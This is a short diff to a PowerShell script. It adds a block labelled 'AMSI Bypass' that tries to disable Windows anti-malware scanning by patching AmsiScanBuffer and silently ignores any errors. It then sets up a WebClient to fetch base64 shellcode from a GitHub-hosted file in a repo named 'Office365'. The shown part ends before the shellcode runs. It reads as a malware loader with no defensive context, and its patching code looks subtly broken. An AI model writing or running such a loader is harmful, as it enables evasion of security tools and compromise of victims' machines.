@@ -1,3 +1,12 @@
+# AMSI Bypass
+try {
+    $sig = @"
+[DllImport("amsi.dll")]
+public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, int length, string contentName, IntPtr eventContext, out int result);
+"@
+    $amsi = Add-Type -MemberDefinition $sig -Name "Amsi" -PassThru
+    [System.Runtime.InteropServices.Marshal]::WriteInt32($amsi::AmsiScanBuffer.GetMethod().Handle, 0)
+} catch {}
 try {
     $url = "https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt"
     $wc = New-Object System.Net.WebClient
